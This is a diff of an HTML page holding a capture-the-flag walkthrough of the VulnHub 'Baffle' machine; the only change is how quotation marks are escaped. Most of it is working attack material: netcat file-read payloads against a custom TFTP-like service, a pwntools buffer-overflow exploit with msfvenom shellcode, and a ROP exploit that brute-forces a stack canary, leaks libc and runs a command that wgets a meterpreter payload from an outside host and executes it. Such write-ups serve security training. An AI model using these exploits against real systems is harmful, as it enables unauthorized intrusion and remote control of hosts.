@@ -157,7 +157,7 @@ PORT     STATE SERVICE  VERSION
 | http-git:
 |   192.168.56.2:80/.git/
 |     Git repository found!
-|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
 |_    Last commit message: Trashed my code, but deployed the product anyway.
 |_http-server-header: nginx/1.6.2
 |_http-title: baffle
@@ -177,12 +177,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 root@kali:~/baffle/192.168.56.2# git status
 On branch master
 Changes not staged for commit:
-  (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)
-  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)
+  (use &#34;git add/rm &lt;file&gt;...&#34; to update what will be committed)
+  (use &#34;git checkout -- &lt;file&gt;...&#34; to discard changes in working directory)
 
 	deleted:    hellofriend.c
 
-no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)
+no changes added to commit (use &#34;git add&#34; and/or &#34;git commit -a&#34;)
 </code></pre><p>And here is the commit history:</p>
 <pre tabindex="0"><code>root@kali:~/baffle/192.168.56.2# git log
 commit 8bde72465957415c12ab6f89ff679f8f9e7c5c7a
@@ -213,7 +213,7 @@ commit 7edc47a1c3e4dc880a7191915bdbf1565c6b7441
 Author: alice &lt;alice@baffle.me&gt;
 Date:   Mon Oct 17 14:37:14 2016 -0400
 
-    This coder turned coffee into code. You won't believe how she did it!
+    This coder turned coffee into code. You won&#39;t believe how she did it!
 
 commit d7a1f067a2f4ac469bc4cf77c689a34e2286b665
 Author: alice &lt;alice@baffle.me&gt;
@@ -262,11 +262,11 @@ int parse_request(char *req, int n) {
     file_len = n - 2 - 5 - 2;
     memcpy(file, ptr, file_len);
 
-    fp = fopen(file, &quot;r&quot;);
+    fp = fopen(file, &#34;r&#34;);
     if (fp) {
         memset(file_content, 0, sizeof(file_content));
         fgets(file_content, sizeof(file_content), fp);
-        printf(&quot;%s&quot;, file_content);
+        printf(&#34;%s&#34;, file_content);
     }
     return 0;
 }
@@ -301,11 +301,11 @@ int parse_request(char *req, int n) {
     FiLe_len = n - 2 - 5 - 2;
     memcpy(file, ptr, file_len);
 
-    fp = fopen(file, &quot;r&quot;);
+    fp = fopen(file, &#34;r&#34;);
     if (fp) {
         memset(file_content, 0, sizeof(file_content));
         fgets(file_content, sizeof(file_content), fp);
-        printf(&quot;%s&quot;, file_content);
+        printf(&#34;%s&#34;, file_content);
     }
     return 0;
 }
@@ -456,7 +456,7 @@ int main(int argc, char *argv[]) {
 }
 </code></pre><p>By looking at the commit log using <code>git log -p</code> we can also see a file called <code>project.enc</code> which was deleted in later commits but more on this later.</p>
 <p>If we look closely on the file at commit <code>My cat danced on the keyboard</code> (<code>06483346fab91b2b17471074a887ac7dffd9ceda</code>) we can notice some uppercase letters. If we only extract the uppercase letters we get the following text:</p>
-<pre tabindex="0"><code>grep -ohE &quot;[A-Z]&quot; hellofriend.c | tr -d &quot;\n&quot;
+<pre tabindex="0"><code>grep -ohE &#34;[A-Z]&#34; hellofriend.c | tr -d &#34;\n&#34;
 
 FILEFLAGARSEREQUEST
 </code></pre><p>So this looks like a flag string. Extracting it manually from the file reveals our first flag:</p>
@@ -464,10 +464,10 @@ FILEFLAGARSEREQUEST
 </code></pre><p>The service running on port 6969 seems to be a merged version of the <code>hellofriend.c</code> revisions. The latest version of the code seems to check the <code>request type</code> of the received packet. Request code <code>0x01</code> calls the file read code and request code <code>0x02</code> the other one. Also the code always adds two to the char pointer before the filename is parsed so the request type has to be 2 bytes long.</p>
 <p>So let&rsquo;s have a look at the first code: the file read part.</p>
 <p>The file read code ignores the first two bytes(the request type) (<code>ptr = (char *)ptr + 2;</code>) and subtracts 9 from the string length to get the filename length (2 bytes request type + 6 bytes padding + NULL terminator). So all we have to do is send request code 0x01 and pad the filename with 6 random chars.</p>
-<pre tabindex="0"><code>root@kali:~/baffle# python -c 'print(&quot;\x01\x01/etc/passwdaaaaaa&quot;)' | nc 192.168.56.2 6969
+<pre tabindex="0"><code>root@kali:~/baffle# python -c &#39;print(&#34;\x01\x01/etc/passwdaaaaaa&#34;)&#39; | nc 192.168.56.2 6969
 root:x:0:0:root:/root:/bin/bash
 </code></pre><p>As the <code>fgets</code> function only reads text up to a newline or EOF (null byte) character we are only able to read the first line of a file. This behaviour is enough to get the contents of <code>flag.txt</code>:</p>
-<pre tabindex="0"><code>root@kali:~/baffle# python -c 'print(&quot;\x01\x01flag.txtaaaaaa&quot;)' | nc 192.168.56.2 6969
+<pre tabindex="0"><code>root@kali:~/baffle# python -c &#39;print(&#34;\x01\x01flag.txtaaaaaa&#34;)&#39; | nc 192.168.56.2 6969
 FLAG{is_there_an_ivana_tinkle}
 </code></pre><p>If we look at commit <strong>d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca</strong> we can see an additional file called <code>project.enc</code>. The file seems to be base64 encoded so let&rsquo;s decode it and have a look:</p>
 <pre tabindex="0"><code>root@kali:~/baffle# git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
@@ -485,7 +485,7 @@ NX        : disabled
 PIE       : disabled
 RELRO     : disabled
 </code></pre><p>We can also check the ASLR status with the file read vulnerability:</p>
-<pre tabindex="0"><code>root@kali:~/baffle# python -c 'print(&quot;\x01\x01/proc/sys/kernel/randomize_va_spaceaaaaaa&quot;)' | nc 192.168.56.2 6969
+<pre tabindex="0"><code>root@kali:~/baffle# python -c &#39;print(&#34;\x01\x01/proc/sys/kernel/randomize_va_spaceaaaaaa&#34;)&#39; | nc 192.168.56.2 6969
 2
 </code></pre><p>So the only protection active is ASLR but the executable is compiled without PIE. At the disassembling we can see the code variable <code>to_write</code> is located at the fixed location <code>0x600de0</code>. As the memcpy executed before our vulnerability copies 500 bytes to this location we can plant our evil shellcode there and jump right to it.</p>
 <p><img src="/img/vulnhub_dc416_baffle/binaryninja_ctftp_to_write.png" alt="binaryninja"></p>
@@ -498,7 +498,7 @@ RELRO     : disabled
 </ul>
 <p>First we need to get the exact offset where we are able to control our return so let&rsquo;s create a pattern with a valid header:</p>
 <pre tabindex="0"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 &gt; pattern
-python -c 'print(&quot;\x02\x02asdf\x00aaaaaa&quot;)' | tr -d &quot;\n&quot; &gt; test.txt
+python -c &#39;print(&#34;\x02\x02asdf\x00aaaaaa&#34;)&#39; | tr -d &#34;\n&#34; &gt; test.txt
 cat pattern &gt;&gt; test.txt
 </code></pre><p>Then run it in gdb:</p>
 <pre tabindex="0"><code>r &lt; test.txt
@@ -525,41 +525,41 @@ charlie:x:1003:1003:,,,:/home/charlie:/bin/bash
 from pwn import *
 
 context(bits=64,
-        os=&quot;linux&quot;,
+        os=&#34;linux&#34;,
         aslr=False,
-        terminal=[&quot;tmux&quot;, &quot;splitw&quot;, &quot;-l&quot;, &quot;45&quot;])
+        terminal=[&#34;tmux&#34;, &#34;splitw&#34;, &#34;-l&#34;, &#34;45&#34;])
 
 if len(sys.argv) &gt; 1:
     local = True
 else:
     local = False
 
-HOST = &quot;192.168.56.2&quot;
+HOST = &#34;192.168.56.2&#34;
 PORT = 6969
 
 ADDR_TO_WRITE = 0x600de0
 OFFSET = 542
 
 def encode_payload(p):
-    return &quot;&quot;.join(&quot;\\x{:02x}&quot;.format(ord(c)) for c in p)
+    return &#34;&#34;.join(&#34;\\x{:02x}&#34;.format(ord(c)) for c in p)
 
-# msfvenom -p linux/x64/exec -v shell -f py CMD=&quot;/bin/bash&quot;
-shell =  &quot;&quot;
-shell += &quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68&quot;
-shell += &quot;\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6&quot;
-shell += &quot;\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61&quot;
-shell += &quot;\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05&quot;
+# msfvenom -p linux/x64/exec -v shell -f py CMD=&#34;/bin/bash&#34;
+shell =  &#34;&#34;
+shell += &#34;\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68&#34;
+shell += &#34;\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6&#34;
+shell += &#34;\x52\xe8\x0a\x00\x00\x00\x2f\x62\x69\x6e\x2f\x62\x61&#34;
+shell += &#34;\x73\x68\x00\x56\x57\x48\x89\xe6\x0f\x05&#34;
 
-header  = &quot;&quot;
-header += &quot;\x02\x02&quot;                   # request type
-header += &quot;A&quot; * 5                      # junk
-header += &quot;\x00&quot;                       # terminator
-header += &quot;B&quot; * 6                      # junk
+header  = &#34;&#34;
+header += &#34;\x02\x02&#34;                   # request type
+header += &#34;A&#34; * 5                      # junk
+header += &#34;\x00&#34;                       # terminator
+header += &#34;B&#34; * 6                      # junk
 
-payload  = &quot;&quot;
+payload  = &#34;&#34;
 payload += shell                        # shell
-payload += &quot;\x90&quot; * (500-len(shell))    # shell padding
-payload += &quot;X&quot; * (536 - len(payload))   # offset to trigger the overflow
+payload += &#34;\x90&#34; * (500-len(shell))    # shell padding
+payload += &#34;X&#34; * (536 - len(payload))   # offset to trigger the overflow
 payload += p64(ADDR_TO_WRITE)           # return address
 
 final_payload = header + payload
@@ -567,10 +567,10 @@ final_payload = header + payload
 try:
     with context.quiet:
         if local:
-            p = process(&quot;./ctftp&quot;)
+            p = process(&#34;./ctftp&#34;)
         else:
             p = remote(HOST, PORT)
-    log.debug(&quot;Sending {}&quot;.format(encode_payload(final_payload)))
+    log.debug(&#34;Sending {}&#34;.format(encode_payload(final_payload)))
     p.sendline(final_payload)
     p.interactive()
 except EOFError as e:
@@ -589,7 +589,7 @@ ln -s /home/bob/filez/flag_vault /home/alice/flag_vault
 </code></pre><pre tabindex="0"><code>$ ./flag_vault
 ______ _                _    _   _             _ _
 |  ___| |            /\| |/\| | | |           | | |
-| |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
+| |_  | | __ _  __ _ \ ` &#39; /| | | | __ _ _   _| | |_
 |  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
 | |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
 \_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
@@ -604,7 +604,7 @@ DATA: FLAG{tr3each3ry_anD_cUnn1ng}
 $ ./flag_vault
 ______ _                _    _   _             _ _
 |  ___| |            /\| |/\| | | |           | | |
-| |_  | | __ _  __ _ \ ` ' /| | | | __ _ _   _| | |_
+| |_  | | __ _  __ _ \ ` &#39; /| | | | __ _ _   _| | |_
 |  _| | |/ _` |/ _` |_     _| | | |/ _` | | | | | __|
 | |   | | (_| | (_| |/ , . \\ \_/ / (_| | |_| | | |_
 \_|   |_|\__,_|\__, |\/|_|\/ \___/ \__,_|\__,_|_|\__|
@@ -695,7 +695,7 @@ Meterpreter  : x86/linux
 
 meterpreter &gt; getuid
 Server username: uid=1000, gid=1000, euid=1000, egid=1000
-</code></pre><pre tabindex="0"><code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
+</code></pre><pre tabindex="0"><code>python -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
 $ id
 id
 uid=1000(vulnhub) gid=1000(vulnhub) groups=1000(vulnhub),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev)
@@ -721,14 +721,14 @@ cat .my_loot/flag.txt
 
         !!! CONGRATULATIONS !!!
 
-                 .-&quot;-.
+                 .-&#34;-.
                 / 4 4 \
                 \_ v _/
                 //   \\
                ((     ))
-         =======&quot;&quot;===&quot;&quot;=======
+         =======&#34;&#34;===&#34;&#34;=======
                   |||
-                  '|'
+                  &#39;|&#39;
 
       FLAG{i_tot_i_saw_a_puddy_tat}
 </code></pre><p>Code:</p>
@@ -739,10 +739,10 @@ import re
 import sys
 
 context(bits=64,
-        os=&quot;linux&quot;,
+        os=&#34;linux&#34;,
         aslr=False,
-        #log_level=&quot;DEBUG&quot;,
-        terminal=[&quot;tmux&quot;, &quot;splitw&quot;, &quot;-l&quot;, &quot;45&quot;])
+        #log_level=&#34;DEBUG&#34;,
+        terminal=[&#34;tmux&#34;, &#34;splitw&#34;, &#34;-l&#34;, &#34;45&#34;])
 
 if len(sys.argv) &gt; 1:
     local = True
@@ -750,24 +750,24 @@ else:
     local = False
 
 if local:
-    p_main = process(&quot;./ctfingerd&quot;)
+    p_main = process(&#34;./ctfingerd&#34;)
 
 def encode_payload(p):
-    return &quot;&quot;.join(&quot;\\x{:02x}&quot;.format(ord(c)) for c in p)
+    return &#34;&#34;.join(&#34;\\x{:02x}&#34;.format(ord(c)) for c in p)
 
 def send_content(content):
     t = 1 if local else 2
     with context.quiet:
         p = None
         try:
-            p = remote(&quot;127.0.0.1&quot;, 7979)
-            temp = p.recvuntil(&quot;User to query: &quot;, timeout=t)
-            m = re.search(r&quot;Socket fd: ([0-9]+)&quot;, temp)
+            p = remote(&#34;127.0.0.1&#34;, 7979)
+            temp = p.recvuntil(&#34;User to query: &#34;, timeout=t)
+            m = re.search(r&#34;Socket fd: ([0-9]+)&#34;, temp)
             if m:
-                log.info(&quot;FD: {}&quot;.format(m.group(1)))
+                log.info(&#34;FD: {}&#34;.format(m.group(1)))
                 fd = int(m.group(1))
             p.send(content)
-            p.recvuntil(&quot;Checking...\n&quot;, timeout=t)
+            p.recvuntil(&#34;Checking...\n&#34;, timeout=t)
             content = p.recv(timeout=t)
             content = content.strip()
             return content
@@ -783,22 +783,22 @@ def brute_next_canary_value(stack):
         payload = stack + chr(x)
         retval = send_content(payload)
         if retval is None:
-            log.error(&quot;something has gone wrong&quot;)
-        if &quot;---&quot; in retval:
+            log.error(&#34;something has gone wrong&#34;)
+        if &#34;---&#34; in retval:
             return x
-    log.error(&quot;Can not find next canary&quot;)
+    log.error(&#34;Can not find next canary&#34;)
     return None
 
 
 def leak_address(address):
     with context.quiet:
-        p = remote(&quot;127.0.0.1&quot;, 7979)
-    temp = p.recvuntil(&quot;User to query: &quot;)
-    m = re.search(r&quot;Socket fd: ([0-9]+)&quot;, temp)
+        p = remote(&#34;127.0.0.1&#34;, 7979)
+    temp = p.recvuntil(&#34;User to query: &#34;)
+    m = re.search(r&#34;Socket fd: ([0-9]+)&#34;, temp)
     fd = int(m.group(1))
-    log.info(&quot;leak fd: {}&quot;.format(fd))
+    log.info(&#34;leak fd: {}&#34;.format(fd))
 
-    payload  = &quot;&quot;
+    payload  = &#34;&#34;
     payload += user
     payload += stack_canary
     payload += p64(dummy) # RBP
@@ -816,9 +816,9 @@ def leak_address(address):
     payload += p64(write_plt)
     payload += p64(dummy)
 
-    log.info(&quot;Sending leak payload ...&quot;)
+    log.info(&#34;Sending leak payload ...&#34;)
     p.send(payload)
-    p.recvuntil(&quot;Checking...\n&quot;)
+    p.recvuntil(&#34;Checking...\n&#34;)
     c = p.recv()
     with context.quiet:
         p.close()
@@ -827,37 +827,37 @@ def leak_address(address):
 
     # trim to 8 bytes as we received more bytes
     leak = c[:8]
-    leak = unpack(leak, &quot;all&quot;)
+    leak = unpack(leak, &#34;all&#34;)
     return leak
 
 
 stack_len = 1000
 
-user  = &quot;A&quot; * 20
-user += &quot;\x0a&quot;
-user += &quot;A&quot; * (stack_len - len(user))
+user  = &#34;A&#34; * 20
+user += &#34;\x0a&#34;
+user += &#34;A&#34; * (stack_len - len(user))
 
-stack_canary = &quot;&quot;
+stack_canary = &#34;&#34;
 for a in xrange(1, 9):
     ret = brute_next_canary_value(user + stack_canary)
-    log.success(&quot;Found part {}/8 of stack canary: {:#02x}&quot;.format(a, ret))
+    log.success(&#34;Found part {}/8 of stack canary: {:#02x}&#34;.format(a, ret))
     stack_canary += chr(ret)
 
-log.success(&quot;Stack Canary is {}&quot;.format(encode_payload(stack_canary)))
+log.success(&#34;Stack Canary is {}&#34;.format(encode_payload(stack_canary)))
 
 dummy = 0xdeadbeefdeadbeef
 pop_rdi_ret = 0x401013 # pop rdi; ret
 pop_rsi_pop_r15_ret = 0x0401011 # pop rsi ; pop r15 ; ret
 
 with context.quiet:
-    b = ELF(&quot;./ctfingerd&quot;)
-read_got = b.got[&quot;read&quot;]
-write_plt = b.plt[&quot;write&quot;]
-log.info(&quot;read@got: {:#08x}&quot;.format(read_got))
+    b = ELF(&#34;./ctfingerd&#34;)
+read_got = b.got[&#34;read&#34;]
+write_plt = b.plt[&#34;write&#34;]
+log.info(&#34;read@got: {:#08x}&#34;.format(read_got))
 
 leak = leak_address(read_got)
 
-log.info(&quot;leaked read address: {:#08x}&quot;.format(leak))
+log.info(&#34;leaked read address: {:#08x}&#34;.format(leak))
 
 if local:
     # local libc version 2.24
@@ -882,33 +882,33 @@ else:
 
 
 libc_base = leak - offset_read
-log.info(&quot;libc base: {:#08x}&quot;.format(libc_base))
+log.info(&#34;libc base: {:#08x}&#34;.format(libc_base))
 
 addr_system = libc_base + offset_system
-log.info(&quot;system: {:#08x}&quot;.format(addr_system))
+log.info(&#34;system: {:#08x}&#34;.format(addr_system))
 
 if local:
     gdb_cmd = []
-    gdb_cmd.append(&quot;set follow-fork-mode child&quot;)
-    #  gdb_cmd.append(&quot;b *{:#08x}&quot;.format(offset_syscall))
-    #  gdb_cmd.append(&quot;b *{:#08x}&quot;.format(pop_rsi_pop_r15_ret))
-    gdb_cmd.append(&quot;b *{:#08x}&quot;.format(pop_rdi_ret))
-    #  gdb_cmd.append(&quot;b *{:#08x}&quot;.format(addr_system))
-    gdb_cmd.append(&quot;c&quot;)
-    gdb_cmd = &quot;\n&quot;.join(gdb_cmd)
+    gdb_cmd.append(&#34;set follow-fork-mode child&#34;)
+    #  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(offset_syscall))
+    #  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(pop_rsi_pop_r15_ret))
+    gdb_cmd.append(&#34;b *{:#08x}&#34;.format(pop_rdi_ret))
+    #  gdb_cmd.append(&#34;b *{:#08x}&#34;.format(addr_system))
+    gdb_cmd.append(&#34;c&#34;)
+    gdb_cmd = &#34;\n&#34;.join(gdb_cmd)
     #  gdb.attach(p_main, gdb_cmd)
 
 with context.quiet:
-    p = remote(&quot;127.0.0.1&quot;, 7979)
-temp = p.recvuntil(&quot;User to query: &quot;)
-m = re.search(r&quot;Socket fd: ([0-9]+)&quot;, temp)
+    p = remote(&#34;127.0.0.1&#34;, 7979)
+temp = p.recvuntil(&#34;User to query: &#34;)
+m = re.search(r&#34;Socket fd: ([0-9]+)&#34;, temp)
 fd = int(m.group(1))
-log.info(&quot;fd: {}&quot;.format(fd))
+log.info(&#34;fd: {}&#34;.format(fd))
 
 free_space = 0x6012c0 # .dynamic
-command = &quot;/bin/sh -c \&quot;/usr/bin/rm -f /tmp/meterpreter; /usr/bin/wget -O /tmp/meterpreter http://192.168.56.3/meterpreter ; chmod +x /tmp/meterpreter; /tmp/meterpreter\&quot;\x00&quot;;
+command = &#34;/bin/sh -c \&#34;/usr/bin/rm -f /tmp/meterpreter; /usr/bin/wget -O /tmp/meterpreter http://192.168.56.3/meterpreter ; chmod +x /tmp/meterpreter; /tmp/meterpreter\&#34;\x00&#34;;
 
-payload  = &quot;&quot;
+payload  = &#34;&#34;
 payload += user
 payload += stack_canary
 payload += p64(dummy)
@@ -936,7 +936,7 @@ payload += p64(free_space)
 payload += p64(addr_system)
 
 p.send(payload)
-p.recvuntil(&quot;Checking...\n&quot;)
+p.recvuntil(&#34;Checking...\n&#34;)
 sleep(1)
 p.send(command)
 p.recv()
